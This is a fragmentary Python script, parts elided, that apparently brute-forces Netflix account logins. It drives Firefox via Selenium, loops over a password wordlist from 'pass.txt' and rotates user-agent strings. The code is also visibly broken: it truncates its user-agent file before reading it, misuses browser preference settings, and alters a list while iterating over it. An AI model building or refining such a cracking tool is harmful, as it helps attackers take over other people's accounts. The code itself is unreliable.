...
time.sleep(5)
os.system("cls")
user = open("useragent.txt","w+")
useragentslist = []
for useragents in user:
	useragentslist.append(useragents)
browser = webdriver.Firefox()
w = open("pass.txt","r")
try:
	for wordlist in w:
		for users in useragentslist:
			profile.set_preference(users, "megalol")
			useragentslist.remove(users)
			break
		time.sleep(2)
	...
	os.system("cls")
	print(":( cannot found any account to connect netflix.")
